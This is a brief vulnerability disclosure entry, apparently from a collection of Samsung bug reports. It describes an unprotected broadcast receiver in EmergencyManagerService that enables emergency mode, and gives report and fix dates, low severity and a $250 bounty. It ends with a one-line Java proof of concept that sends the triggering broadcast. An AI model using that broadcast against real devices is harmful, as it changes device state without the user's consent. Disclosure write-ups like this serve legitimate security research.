# Details

<table>
    <tr>
        <td>Name</td>
        <td>EmergencyManagerService</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.emergencymode.service</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.16</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/133.%20EmergencyManagerService%20—%20Enabling%20emergency%20mode/Oversecured_report.png)

Oversecured found in the EmergencyManagerService app in the `com/sec/android/emergencymode/service/EmergencyFactory.java` file a dynamic registration of an unprotected broadcast receiver. When it receives the `android.intent.action.EMERGENCY_KNOX_FORCE_CLOSED` action, it automatically enables emergency mode. However, the user must open the emergency mode screen to trigger to the code activating this broadcast receiver.

**Proof of Concept**

```java
sendBroadcast(new Intent("android.intent.action.EMERGENCY_KNOX_FORCE_CLOSED"));
```
